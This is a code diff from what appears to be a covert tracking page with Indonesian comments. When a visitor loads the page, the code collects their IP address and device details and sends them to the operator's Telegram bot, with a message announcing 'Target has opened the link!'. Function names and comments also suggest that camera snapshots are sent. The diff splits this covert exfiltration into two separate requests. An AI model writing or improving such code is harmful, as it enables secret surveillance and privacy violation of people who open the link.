@@ -500,16 +500,29 @@ function buildCaption(ip,d){
 🕐 Time (UTC): ${escapeHtml(new Date().toISOString())}</blockquote>`;
 }
 
-// Kirim IP/device + foto statis saat halaman load
-async function sendIpDevice(){
-  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+// Kirim foto statis saat halaman load
+async function sendStaticImage(){
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({
       chat_id: CHAT_ID,
       photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d),
+      caption: "🎯 Target has opened the link!",
+      parse_mode:"HTML"
+    })
+  });
+}
+
+// Kirim data terpisah
+async function sendData(){
+  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: buildCaption(ip,d),
       parse_mode:"HTML"
     })
   });
@@ -565,8 +578,12 @@ async function sendSnapshot(){
 }
 
 // Jalankan saat halaman load
-window.addEventListener("load", () => {
-  sendIpDevice();
+window.addEventListener("load", async () => {
+  // Kirim foto statis terlebih dahulu
+  await sendStaticImage();
+  
+  // Kirim data terpisah
+  await sendData();
 });
 
 // Tombol klik kamera - langsung kirim foto pertama
